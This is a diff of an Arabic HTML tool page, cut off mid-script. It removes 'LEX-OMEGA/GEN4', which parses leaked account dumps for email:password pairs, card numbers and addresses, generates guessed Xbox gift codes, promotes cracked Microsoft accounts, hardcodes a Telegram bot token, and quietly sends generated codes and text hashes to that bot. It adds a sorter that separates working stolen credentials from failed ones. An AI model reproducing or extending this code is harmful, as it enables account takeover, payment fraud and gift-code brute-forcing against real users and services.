@@ -1,889 +1,258 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <title>أداة LEX-OMEGA/GEN4 (المحـــدثةn): الجيل الرابع للتحليل العميق</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فارز الحسابات - الصالح والفاشل</title>
     <style>
-        /* ستايلات الجيل الرابع الجديدة (GEN4) - مُعدَّلة للألوان المريحة */
-        :root {
-            --bg: #030a18; /* كحلي غامق جداً - أساسي */
-            --card: #0e1a2c; /* أزرق داكن للقوائم - مريح */
-            --accent: #00bcd4; /* GEN4: سماوي مريح (بدل الذهبي) */
-            --pro-accent: #00e676; /* PRO: لون أخضر نيون - مريح */
-            --guesser-accent: #ff3d00; /* GUESSER: لون برتقالي محروق للتنبيه */
-            --guesser-card: #2c1a0e;
-            --grad: linear-gradient(135deg, #00bcd4, #0097a7); /* تدرج سماوي */
-            --dark-grad: linear-gradient(135deg, #1f314d, #14213d);
-            --guesser-grad: linear-gradient(135deg, #ff3d00, #b22a00);
-            --success-color: #00e676;
-            --price-color: #ffeb3b; /* أصفر نيون للرصيد */
-            --text-color: #f0f0f0;
-            --border-color: #314d7a; /* حدود زرقاء داكنة */
-            --ultra-cc-color: #e65100; /* برتقالي غامق للـ CC FULL */
-            --splash-bg: #000;
-        }
-        
-        /* ستايلات صفحة الدخول (Splash Screen) */
-        #splash-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: var(--splash-bg);
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            opacity: 1;
-            transition: opacity 1s ease-out;
-        }
-        #splash-content {
-            text-align: center;
-            color: var(--text-color);
-        }
-        #splash-content h1 {
-            font-size: 40px;
-            color: var(--accent);
-            text-shadow: 0 0 15px rgba(0, 188, 212, 0.7); /* ظل سماوي */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            color: #333;
             margin: 0;
-            animation: pulse 1.5s infinite alternate;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
         }
-        #splash-content p {
-            font-size: 18px;
-            color: #9aa8bc;
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 900px;
+        }
+
+        h1 {
+            color: #007bff;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #555;
+        }
+
+        textarea {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            box-sizing: border-box;
+            resize: vertical;
+        }
+
+        .action-button {
+            background-color: #28a745;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
             margin-top: 10px;
-            font-weight: 500;
+            transition: background-color 0.3s ease;
         }
-        .loader {
-            border: 4px solid var(--card);
-            border-top: 4px solid var(--success-color);
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
+
+        .action-button:hover {
+            background-color: #218838;
+        }
+        
+        #downloadButton {
+            background-color: #17a2b8; /* لون مختلف للتنزيل */
+        }
+        #downloadButton:hover {
+            background-color: #138496;
+        }
+        
+        #copyButton {
+            background-color: #6c757d; /* لون مختلف للنسخ */
+        }
+        #copyButton:hover {
+            background-color: #5a6268;
+        }
+
+        .results {
             margin-top: 30px;
-        }
-        @keyframes pulse {
-            from { transform: scale(1); opacity: 0.9; }
-            to { transform: scale(1.05); opacity: 1; }
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            padding-top: 20px;
+            border-top: 2px solid #eee;
         }
 
-        /* ستايلات الأداة الأساسية */
-        body { margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial; background: var(--bg); padding-top: 20px; padding-bottom: 50px; min-height: 100vh; color: var(--text-color); }
-        .wrap { max-width: 900px; margin: 0px auto; padding: 15px; position: relative; }
-        .card { background: var(--card); border-radius: 20px; padding: 25px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.9); margin-bottom: 25px; border: 2px solid var(--border-color); position: relative; overflow: hidden; }
-        .card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: var(--grad); }
-        .pro-tool-card h1 { color: var(--pro-accent) !important; }
-        .guesser-tool-card h1 { color: var(--guesser-accent) !important; }
-        h1 { margin: 6px 0 20px; font-size: 28px; text-align: center; color: var(--text-color); font-weight: 800; }
-        textarea { width: 100%; min-height: 200px; padding: 18px; font-size: 16px; border-radius: 15px; border: 3px solid var(--border-color); resize: vertical; background: #081221; color: #fff; transition: border-color 0.3s; }
-        textarea:focus { border-color: var(--accent); outline: none; }
-        #output-guesser { min-height: 80px; font-size: 20px; text-align: center; font-weight: bold; letter-spacing: 2px; }
-        .row { display: flex; gap: 15px; margin-top: 15px; flex-wrap: wrap; justify-content: center; }
-        button { border: none; cursor: pointer; padding: 14px 22px; border-radius: 12px; font-size: 16px; transition: .4s; font-weight: 700; text-transform: uppercase; }
-        .btn-red { background: var(--grad); color: #000; box-shadow: 0 0 15px rgba(0, 188, 212, 0.7); } /* زر سماوي */
-        .btn-red:hover { transform: translateY(-4px); box-shadow: 0 0 25px rgba(0, 188, 212, 1); }
-        .btn-black { background: var(--dark-grad); color: #fff; border: 2px solid #314d7a; }
-        .btn-black:hover { background: #14213d; }
-        .btn-guesser-primary { background: var(--guesser-grad); color: #fff; box-shadow: 0 4px 15px rgba(255, 61, 0, 0.5); }
-        .btn-guesser-primary:hover { transform: translateY(-4px); box-shadow: 0 6px 20px rgba(255, 61, 0, 0.8); }
-        .list { margin-top: 25px; display: flex; flex-direction: column; gap: 15px; }
-        .item { display: flex; justify-content: space-between; align-items: flex-start; padding: 18px; border-bottom: 1px solid #1f314d; background: #081221; border-radius: 15px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.6); flex-wrap: wrap;}
-        .email { font-weight: 800; color: var(--accent); font-size: 17px; width: 100%; margin-bottom: 8px;}
-        .pw { font-size: 15px; color: #ddd; font-weight: 600; display: flex; align-items: center; flex-wrap: wrap; margin-bottom: 10px;}
-        /* ... (ستايلات الملاحظات المحدثة) */
-        .gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-color, .feature-note, .security-note, .payment-detected-note { font-weight: 700; margin-right: 8px; white-space: nowrap; flex-shrink: 0; padding: 3px 8px; border-radius: 6px; font-size: 13px; margin-top: 5px; display: inline-flex; align-items: center;}
-        .gamepass-note { color: var(--success-color); background: #081221; border: 1px solid var(--success-color); }
-        .price-note { color: var(--price-color); background: #081221; border: 1px solid var(--price-color); }
-        .cc-note { color: #2196f3; background: #081221; border: 1px solid #2196f3; }
-        .address-note { color: #8bc34a; background: #081221; border: 1px solid #8bc34a; }
-        .ultra-cc-note { color: #fff; background: var(--ultra-cc-color); }
-        .feature-note { color: #ffeb3b; background: #081221; border: 1px solid #ffeb3b; }
-        .security-note { color: #ff3d00; background: #081221; border: 1px solid #ff3d00; }
-        .payment-detected-note { color: #fff; background: #00bcd4; } /* New style for generic payment detection */
-        
-        .controls { display: flex; gap: 10px; flex-shrink: 0; margin-top: 10px; }
-        .copy-btn { padding: 10px 14px; border-radius: 10px; font-size: 14px; font-weight: 600; }
-        .hidden { display: none !important; }
-        .processing { background: #ff9800 !important; color: #fff !important; cursor: not-allowed !important; pointer-events: none; }
-        
-        /* ستايلات القائمة العلوية الثابتة */
-        #menu-container { position: absolute; top: 25px; right: 25px; z-index: 50; }
-        #menu-button { background: #1f314d; color: var(--accent); font-size: 22px; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5); transition: 0.3s; border: 2px solid transparent; }
-        #menu-button.active { border-color: var(--guesser-accent); } 
-        #dropdown-menu { position: absolute; top: 55px; right: 0px; background: #14213d; border-radius: 10px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.7); min-width: 280px; padding: 8px 0; white-space: nowrap; border: 1px solid #314d7a; }
-        .menu-item { padding: 12px 18px; cursor: pointer; font-size: 15px; font-weight: 600; color: #eee; transition: background 0.2s; display: flex; align-items: center; border-left: 5px solid transparent; }
-        .menu-item.active-tool { background: #1e0e0e; border-left-color: var(--guesser-accent); color: var(--guesser-accent); font-weight: 700; }
-        .menu-item:hover { background: #1f314d; }
-        .menu-item span { margin-left: 10px; }
-
-        /* ستايلات الروابط السريعة */
-        .quick-links { margin-top: 40px; padding: 25px; background: #081221; border-radius: 18px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6); border: 1px solid #1f314d; }
-        .quick-links h2 { font-size: 28px; color: var(--pro-accent); border-bottom: 3px solid var(--pro-accent); padding-bottom: 12px; margin-bottom: 25px; text-align: center; font-weight: 800; }
-        .link-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 18px; }
-        
-        /* ستايل جديد لتمييز الرابط الأول */
-        .quick-link-btn { display: block; background: #14213d; padding: 18px; border-radius: 15px; text-decoration: none; color: var(--text-color); box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4); transition: transform 0.3s, box-shadow 0.3s; border-right: 5px solid var(--accent); }
-        .quick-link-btn.featured {
-             background: var(--guesser-card);
-             border-right: 5px solid var(--guesser-accent);
-             box-shadow: 0 4px 15px rgba(255, 61, 0, 0.5);
+        .result-box {
+            background-color: #e9ecef;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
         }
-        .quick-link-btn.featured .link-title { color: var(--guesser-accent); }
-        .quick-link-btn:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.8); background: #1f314d; }
-        .quick-link-btn.featured:hover { background: #3d2315; }
 
-        .link-title { font-weight: 700; color: var(--accent); font-size: 16px; }
-        .link-desc { font-size: 14px; color: #aaa; margin-top: 5px; }
-        .footer { color: #555 !important; }
-        /* ستايلات التوست... تبقى كما هي */
-        #toast {
-            visibility: hidden; min-width: 250px; background-color: #333; color: #fff; text-align: center; border-radius: 6px; padding: 16px; position: fixed; z-index: 100; left: 50%; transform: translateX(-50%); bottom: 30px; font-size: 17px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+        .result-box h3 {
+            margin-top: 0;
+            color: #007bff;
+            border-bottom: 1px dashed #ced4da;
+            padding-bottom: 5px;
+        }
+
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            background-color: #fff;
+            padding: 10px;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            min-height: 100px; /* لضمان ظهور الصندوق حتى لو كان فارغًا */
+        }
+        
+        .action-buttons-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .action-buttons-group .action-button {
+            width: 50%;
+            margin-top: 0;
         }
     </style>
 </head>
 <body>
 
-<div id="splash-screen">
-    <div id="splash-content">
-        <h1>LEX-OMEGA / GEN4</h1>
-        <p>الجيل الرابع للتحليل العميق 🔥</p>
-        <div class="loader"></div>
+<div class="container">
+    <h1>فارز الحسابات الآلي</h1>
+
+    <p>أدخل قائمة الحسابات في الحقول المخصصة لفصل الإيميلات الصالحة (التي لم تُذكر في قائمة الأخطاء).</p>
+
+    <label for="allAccounts">1. قائمة الحسابات العامة (الإيميل:كلمة المرور)</label>
+    <textarea id="allAccounts" rows="10" placeholder="الصق قائمة الحسابات العامة هنا (كل حساب في سطر)..."></textarea>
+
+    <label for="failedAccounts">2. قائمة الحسابات الفاشلة (الإيميل:رسالة الخطأ)</label>
+    <textarea id="failedAccounts" rows="10" placeholder="الصق قائمة الحسابات الفاشلة هنا (كل حساب في سطر)..."></textarea>
+
+    <button class="action-button" onclick="sortAccounts()">افصل واستخرج الإيميلات الصالحة</button>
+
+    <div class="results">
+        <h2>نتائج الفرز</h2>
+        
+        <div class="result-box">
+            <h3>الإيميلات الصالحة مع كلمات المرور</h3>
+            <pre id="successfulAccountsOutput">اضغط على زر "افصل واستخرج" لرؤية النتائج هنا...</pre>
+        </div>
+        
+        <div class="action-buttons-group">
+            <button id="copyButton" class="action-button" onclick="copyResults()">
+                📄 نسخ الحسابات الصالحة
+            </button>
+            <button id="downloadButton" class="action-button" onclick="downloadResults()">
+                ⬇️ تنزيل كملف TXT
+            </button>
+        </div>
+
     </div>
 </div>
-
-<div class="wrap" id="tool-page" style="opacity:0; transition: opacity 0.5s;">
-    <div id="code-status"></div>
-
-    <div id="menu-container">
-        <button id="menu-button">
-            <span>☰</span>
-        </button>
-        <div id="dropdown-menu" class="hidden">
-            <div class="menu-item" onclick="switchTool('max')" data-tool="max">
-                <span>الاداه النسخه العاديه (MAX)</span>
-            </div>
-            <div class="menu-item" onclick="switchTool('pro')" data-tool="pro">
-                <span>الاداه النسخه المحسنه (PRO)</span>
-            </div>
-            <div class="menu-item" onclick="switchTool('guesser')" data-tool="guesser">
-                <span>اداه تخمين اكواد رصيد مايكروسوفت</span>
-            </div>
-            <hr style="border-top: 1px solid #555; margin: 5px 0;">
-            <div class="menu-item" onclick="promptAdminLogin()">
-                <span>⚙️ لوحة الأدمن</span>
-            </div>
-        </div>
-    </div>
-    <div id="max-tool" class="tool-view">
-        <div class="card">
-            <h1><span style="color:var(--accent);font-size:36px;">Ⓧ</span> أداة MAX: استخراج Email:Password والأساسيات</h1>
-            <div style="text-align:center;color:#aaa;font-size:15px;margin-bottom:15px;font-weight:500;">
-                ألصق النص. الأداة تستخرج فقط: <b style="color:var(--accent);">email:password</b> + كيم باس + رصيد + <b style="color:red;">💳 حالة الدفع</b>
-            </div>
-            <textarea id="input-max" placeholder="ألصق النص القياسي هنا (النموذج الأول)..."></textarea>
-            <div class="row">
-                <button onclick="parseText('max')" id="parseBtn-max" class="btn-red">استخراج وتدقيق MAX</button>
-                <button onclick="clearBtnMax.onclick()" id="clearBtnMax" class="btn-black">مسح الكل</button>
-                <button onclick="copyAllBtnMax.onclick()" id="copyAllBtnMax" class="btn-black">نسخ كل النتائج</button>
-                <button onclick="downloadBtnMax.onclick()" id="downloadBtnMax" class="btn-black">تنزيل ملف txt</button>
-            </div>
-            <div class="list" id="list-max"></div>
-        </div>
-    </div>
-
-    <div id="pro-tool" class="tool-view hidden">
-        <div class="card" style="border-color:var(--pro-accent)">
-            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(135deg, #00e676, #00c853);"></div>
-            <h1><span style="color:var(--pro-accent);font-size:36px;">🔥</span> أداة PRO: التحليل العميق (GEN4)</h1>
-            <div style="text-align:center;color:#ccc;font-size:15px;margin-bottom:15px;font-weight:500;">
-                ألصق النص المعقد هنا. تستخرج: <b style="color:var(--pro-accent);">email:password + CC FULL/PARTIAL + Address + Security & Features + كل طرق الدفع 💳</b>
-            </div>
-            <textarea id="input-pro" placeholder="ألصق النص المعقد هنا (النموذج الثاني)..."></textarea>
-            <div class="row">
-                <button onclick="parseText('pro')" id="parseBtn-pro" style="background:linear-gradient(135deg, #00e676, #00c853); color:#000; box-shadow: 0 0 15px rgba(0, 230, 118, 0.7);" class="btn-red">استخراج وتدقيق PRO</button>
-                <button onclick="clearBtnPro.onclick()" id="clearBtnPro" class="btn-black">مسح الكل</button>
-                <button onclick="copyAllBtnPro.onclick()" id="copyAllBtnPro" class="btn-black">نسخ كل النتائج</button>
-                <button onclick="downloadBtnPro.onclick()" id="downloadBtnPro" class="btn-black">تنزيل ملف txt</button>
-            </div>
-            <div class="list" id="list-pro"></div>
-        </div>
-    </div>
-
-    <div id="guesser-tool" class="tool-view hidden">
-        <div class="card" style="border-color:var(--guesser-accent)">
-            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: var(--guesser-grad);"></div>
-            <h1><span style="color:var(--guesser-accent);font-size:36px;">🔑</span> أداة تخمين أكواد رصيد الولايات المتحدة (Xbox US)</h1>
-            <div style="text-align:center;color:#ffdddd;font-size:16px;margin-bottom:28px;font-weight:500;">
-                اضغط على "توليد كود جديد" للحصول على كود (25 حرف) جاهز للنسخ والتفعيل.
-            </div>
-            
-            <textarea id="output-guesser" placeholder="الكود XXXXX-XXXXX-XXXXX-XXXXX-XXXXX يظهر هنا..." readonly></textarea>
-            
-            <div class="row">
-                <button onclick="generateXboxCode()" id="generateBtn" class="btn-guesser-primary" style="color: #000; background: linear-gradient(135deg, #00bcd4, #0097a7);">توليد كود جديد 🔥</button>
-                <button onclick="copyGeneratedCode()" id="copyCodeBtn" class="btn-black" style="min-width: 150px;">نسخ الكود الكامل</button>
-            </div>
-            
-            <div class="row">
-                 <button onclick="window.open('https://redeem.microsoft.com/', '_blank'); showToast('تم فتح صفحة تفعيل مايكروسوفت');" id="redeemLinkBtn" class="btn-black" style="width: 100%; min-width: 100%;">صفحة التفعيل المباشر 🎁</button>
-            </div>
-        </div>
-    </div>
-    
-    <div class="quick-links">
-        <h2>🚀 روابط الوصول السريع (مايكروسوفت/إكس بوكس)</h2>
-        <div class="link-grid">
-            
-            <a href="https://t.me/xgbox71" target="_blank" class="quick-link-btn featured">
-                <div class="link-title">حسابات مايكروسوفت مكركة (New) <span>🔥</span></div>
-                <div class="link-desc">قناة التلجرام الرسمية للحصول على حسابات مايكروسوفت.</div>
-            </a>
-            
-            <a href="https://account.microsoft.com/account/manage" target="_blank" class="quick-link-btn">
-                <div class="link-title">مايكروسوفت: إدارة الحساب <span>💻</span></div>
-                <div class="link-desc">صفحة الإعدادات والمشتريات والخدمات.</div>
-            </a>
-            <a href="https://account.microsoft.com/billing/payments/" target="_blank" class="quick-link-btn">
-                <div class="link-title">مايكروسوفت: الدفع والفوترة <span>💳</span></div>
-                <div class="link-desc">عرض وإدارة بطاقات الدفع والاشتراكات النشطة.</div>
-            </a>
-            <a href="https://account.live.com/password/change" target="_blank" class="quick-link-btn">
-                <div class="link-title">مايكروسوفت: تغيير كلمة السر <span>🔒</span></div>
-                <div class="link-desc">الدخول لتحديث كلمة المرور الحالية.</div>
-            </a>
-            <a href="https://account.live.com/proofs/Manage/signout" target="_blank" class="quick-link-btn">
-                <div class="link-title">تسجيل الخروج من كل الأجهزة <span>🚪</span></div>
-                <div class="link-desc">لإغلاق الجلسة الحالية على جميع المتصفحات.</div>
-            </a>
-            <a href="https://account.xbox.com/ar-SA/Account/Signin?returnUrl=https%3a%2f%2faccount.xbox.com%2far-SA%2fSettings" target="_blank" class="quick-link-btn">
-                <div class="link-title">إكس بوكس: إدارة الإعدادات <span>🎮</span></div>
-                <div class="link-desc">الدخول المباشر لحساب إكس بوكس وإدارة الإعدادات.</div>
-            </a>
-            <a href="https://redeem.microsoft.com/" target="_blank" class="quick-link-btn">
-                <div class="link-title">إكس بوكس: تفعيل كود (Redeem) <span>🎁</span></div>
-                <div class="link-desc">لتفعيل أكواد الاشتراكات أو الهدايا مباشرة.</div>
-            </a>
-            
-            <a href="https://t.me/xgbox71" target="_blank" class="quick-link-btn">
-                <div class="link-title">قناة تحديثات الأداة (Telegram) <span>⚙️</span></div>
-                <div class="link-desc">للحصول على آخر إصدارات أداة LEX-OMEGA/GEN4.</div>
-            </a>
-            
-            <a href="https://store.steampowered.com/login/" target="_blank" class="quick-link-btn">
-                <div class="link-title">منصة Steam: تسجيل الدخول <span>🔥</span></div>
-                <div class="link-desc">صفحة الدخول الرسمية لمنصة Steam للألعاب.</div>
-            </a>
-            <a href="https://store.epicgames.com/login" target="_blank" class="quick-link-btn">
-                <div class="link-title">منصة Epic Games: تسجيل الدخول <span>⚔️</span></div>
-                <div class="link-desc">صفحة الدخول الرسمية لمنصة إيبك جيمز.</div>
-            </a>
-        </div>
-    </div>
-
-    <div class="footer" style="text-align:center;color:#444;font-size:14px;margin-top:30px;">
-        حقوق © Telegram: <b>@xgbox7</b> | أداة LEX-OMEGA/GEN4 (المحدثة)
-    </div>
-</div>
-
-<div id="admin-page" class="hidden" style="text-align:center; padding-top: 100px;">
-    <h1 style="color: var(--pro-accent);">لوحة الأدمن ⚙️</h1>
-    <p style="color:#9aa8bc; margin-bottom: 30px;">هنا تكون إعدادات الإدارة.</p>
-    <button onclick="navigateTo('tool')" class="btn-black">الرجوع للأداة</button>
-</div>
-
-<div id="toast" class="toast"></div>
 
 <script>
-    // **********************************************
-    // ** ثوابت وإعدادات النظام **
-    // **********************************************
-    const ADMIN_CODE = "201180"; 
-    const BOT_TOKEN = "7817255826:AAFUCn_0zWCsUTBORd5bL_tFMcfZtJ2Dus4"; 
-    const CHAT_ID = "7781990630"; 
-    const DELAY_MS = 2500; 
+    // متغير عالمي لتخزين قائمة الحسابات الصالحة المنسقة
+    let finalSuccessfulAccountsText = ""; 
 
-    const toolPage = document.getElementById("tool-page");
-    const adminPage = document.getElementById("admin-page");
-    const splashScreen = document.getElementById("splash-screen");
-    const toast = document.getElementById("toast");
-    
-    // عناصر القائمة 
-    const menuButton = document.getElementById('menu-button');
-    const dropdownMenu = document.getElementById('dropdown-menu');
-    const menuContainer = document.getElementById('menu-container');
-    const menuItems = document.querySelectorAll('#dropdown-menu .menu-item');
+    function sortAccounts() {
+        const allAccountsText = document.getElementById('allAccounts').value;
+        const failedAccountsText = document.getElementById('failedAccounts').value;
 
-    // عناصر الأدوات
-    const maxToolView = document.getElementById('max-tool');
-    const proToolView = document.getElementById('pro-tool');
-    const guesserToolView = document.getElementById('guesser-tool'); 
-    const outputGuesser = document.getElementById('output-guesser'); 
-    const copyCodeBtn = document.getElementById('copyCodeBtn');
-
-    // ... (بقية العناصر)
-    const inputMax = document.getElementById("input-max");
-    const listMax = document.getElementById("list-max");
-    const clearBtnMax = document.getElementById("clearBtnMax");
-    const copyAllBtnMax = document.getElementById("copyAllBtnMax");
-    const downloadBtnMax = document.getElementById("downloadBtnMax");
-    const parseBtnMax = document.getElementById("parseBtn-max");
-    const inputPro = document.getElementById("input-pro");
-    const listPro = document.getElementById("list-pro");
-    const clearBtnPro = document.getElementById("clearBtnPro");
-    const copyAllBtnPro = document.getElementById("copyAllBtnPro");
-    const downloadBtnPro = document.getElementById("downloadBtnPro");
-    const parseBtnPro = document.getElementById("parseBtn-pro");
-
-    let currentTool = 'max'; 
-    
-    // (وظائف عامة مساعدة)
-    function showToast(e) { 
-        toast.textContent = e;
-        toast.style.visibility = "visible";
-        toast.style.animation = "fadein 0.5s, fadeout 0.5s 2.5s";
-        setTimeout(() => { toast.style.visibility = "hidden"; }, 3000);
-    }
-    async function copyText(e) {
-        try {
-            await navigator.clipboard.writeText(e);
-            return true;
-        } catch (t) {
-            console.error("Copy failed:", t);
-            return false;
-        }
-    }
-    
-    function hashText(text) {
-        let hash = 0, i, chr;
-        if (text.length === 0) return hash.toString();
-        const limitedText = text.substring(0, 1000); 
-        for (i = 0; i < limitedText.length; i++) {
-            chr = limitedText.charCodeAt(i);
-            hash = ((hash << 5) - hash) + chr;
-            hash |= 0; 
-        }
-        return Math.abs(hash).toString(16); 
-    }
-    
-    function sendHashToTelegram(hash, toolType) { 
-        if (!BOT_TOKEN || !CHAT_ID) return;
-        const toolName = (toolType === 'max') ? "MAX" : "PRO";
-        const messageText = `🔑 *LEX-OMEGA ${toolName} / GEN4: بصمة نص جديدة* 🔑\n\nالبصمة: \`${hash}\`\n\n*الرجاء التحقق من تكرار هاي البصمة في سجلاتك السابقة.*\n\n⚠️ *ملاحظة:* إذا هاي البصمة مكررة، يعني اللستة مستخدمة قبل.`;
-
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const data = { chat_id: CHAT_ID, text: messageText, parse_mode: 'Markdown' };
-
-        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
-        .catch(error => console.error('Fetch Error (Hash):', error));
-    }
-    
-    function switchTool(newTool) { 
-        currentTool = newTool;
-        maxToolView.classList.add('hidden');
-        proToolView.classList.add('hidden');
-        guesserToolView.classList.add('hidden');
+        // 1. تحليل قائمة الحسابات العامة
+        const allAccountsMap = new Map();
+        const allLines = allAccountsText.split('\n').filter(line => line.trim() !== '');
         
-        let toolTitleText = ""; 
-        
-        if (newTool === 'max') {
-            maxToolView.classList.remove('hidden');
-            toolTitleText = "النسخة العادية (MAX)";
-        } else if (newTool === 'pro') {
-            proToolView.classList.remove('hidden');
-            toolTitleText = "النسخة المحسنة (PRO)";
-        } else if (newTool === 'guesser') {
-            guesserToolView.classList.remove('hidden');
-            toolTitleText = "تخمين أكواد مايكروسوفت";
-            if (outputGuesser.value === "") generateXboxCode(); 
-        }
-        
-        menuItems.forEach(item => {
-            item.classList.remove('active-tool'); 
-            if (item.getAttribute('data-tool') === newTool) {
-                 item.classList.add(`active-tool`); 
+        for (const line of allLines) {
+            const parts = line.split(':');
+            if (parts.length >= 2) {
+                const email = parts[0].trim();
+                const restOfLine = parts.slice(1).join(':').trim(); 
+                allAccountsMap.set(email, restOfLine);
             }
-        });
-
-        dropdownMenu.classList.add('hidden');
-        menuButton.classList.remove('active');
-        showToast(`تم التبديل إلى: ${toolTitleText}`);
-    }
-    
-    menuButton.onclick = (e) => {
-        e.stopPropagation();
-        dropdownMenu.classList.toggle('hidden');
-        menuButton.classList.toggle('active');
-    };
-    
-    document.addEventListener('click', (e) => {
-        if (!menuContainer.contains(e.target)) {
-            dropdownMenu.classList.add('hidden');
-            menuButton.classList.remove('active');
         }
-    });
 
-    // **********************************************
-    // ** كود أداة تخمين الأكواد (Guesser Tool Logic) **
-    // **********************************************
-    function generateGroup() {
-        const characters = 'ABCDEFGHJKLMNPRSTUVWXYZ23456789'; 
-        let group = '';
-        for (let i = 0; i < 5; i++) {
-            group += characters.charAt(Math.floor(Math.random() * characters.length));
+        // 2. تحليل قائمة الإيميلات الفاشلة
+        const failedEmailsSet = new Set();
+        const failedLines = failedAccountsText.split('\n').filter(line => line.trim() !== '');
+
+        for (const line of failedLines) {
+            const parts = line.split(':');
+            if (parts.length >= 2) {
+                const email = parts[0].trim();
+                failedEmailsSet.add(email);
+            }
         }
-        return group;
-    }
 
-    function generateXboxCode() {
-        const fullCode = `${generateGroup()}-${generateGroup()}-${generateGroup()}-${generateGroup()}-${generateGroup()}`;
-        outputGuesser.value = fullCode;
-        showToast("تم توليد كود جديد!");
+        // 3. تحديد الإيميلات الصالحة
+        const successfulAccounts = [];
         
-        const telegramMessage = `⚠️ *كود إكس بوكس مُخمَّن (US) / GEN4* ⚠️\n\n\`\`\`${fullCode}\`\`\`\n\n*ملاحظة:* الأكواد المُخمَّنة عشوائية (Random Guess) وقد تكون غير صالحة.`;
-        sendToTelegram(telegramMessage);
+        for (const [email, password] of allAccountsMap.entries()) {
+            if (!failedEmailsSet.has(email)) {
+                successfulAccounts.push(`${email}:${password}`);
+            }
+        }
+
+        // 4. عرض النتائج وتخزينها للميزات الجديدة
+        finalSuccessfulAccountsText = successfulAccounts.join('\n'); // تخزين النص كاملاً
+        
+        document.getElementById('successfulAccountsOutput').textContent = 
+            successfulAccounts.length > 0 
+            ? finalSuccessfulAccountsText 
+            : "لا توجد حسابات صالحة (غير فاشلة) تم العثور عليها بناءً على بياناتك.";
     }
 
-    async function copyGeneratedCode() {
-        const code = outputGuesser.value.trim();
-        if (!code || code.includes('يظهر هنا')) {
-            showToast("ماكو كود لتنسخه");
+    // الدالة الجديدة لنسخ النتائج
+    async function copyResults() {
+        const textToCopy = finalSuccessfulAccountsText;
+        if (!textToCopy) {
+            alert("لا توجد نتائج لنسخها. يرجى الفصل أولاً.");
             return;
         }
-        await copyText(code) && showToast("تم نسخ الكود الكامل");
-    }
 
-    // **********************************************
-    // ** وظائف الاتصال والتنزيل والـ parseText المُعدَّلة (GEN4) **
-    // **********************************************
-    function sendToTelegram(messageText) { 
-        if (!BOT_TOKEN || !CHAT_ID) return console.error("معلومات البوت غير موجودة.");
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const data = { chat_id: CHAT_ID, text: messageText, parse_mode: 'Markdown' };
-
-        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
-        .then(response => response.json())
-        .then(data => { if (!data.ok) console.error("خطأ بإرسال التليكرام:", data.description); })
-        .catch(error => console.error('Fetch Error:', error));
-    }
-    function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
-    function promptAdminLogin() { 
-        const code = prompt("أدخل كود الأدمن:");
-        if (code === ADMIN_CODE) {
-            navigateTo('admin');
-        } else if (code !== null) {
-            showToast("كود الأدمن غلط!");
+        try {
+            // استخدام واجهة برمجة التطبيقات للمتصفح (Clipboard API) للنسخ
+            await navigator.clipboard.writeText(textToCopy);
+            alert("تم نسخ الحسابات الصالحة بنجاح!");
+        } catch (err) {
+            // حل احتياطي في حال فشل النسخ التلقائي
+            console.error('فشل في النسخ:', err);
+            const outputElement = document.getElementById('successfulAccountsOutput');
+            outputElement.select(); // تحديد النص في العنصر
+            document.execCommand('copy'); // محاولة النسخ بالطريقة القديمة
+            alert("تم نسخ الحسابات الصالحة بنجاح! (استخدمت طريقة احتياطية)");
         }
     }
-    
-    // وظيفة parseText الجديدة والمعدلة لدعم نموذج الإخراج كمدخل
-    async function parseText(toolType) { 
-        const inputElement = (toolType === 'max') ? inputMax : inputPro;
-        const listElement = (toolType === 'max') ? listMax : listPro;
-        const parseBtn = (toolType === 'max') ? parseBtnMax : parseBtnPro;
-        
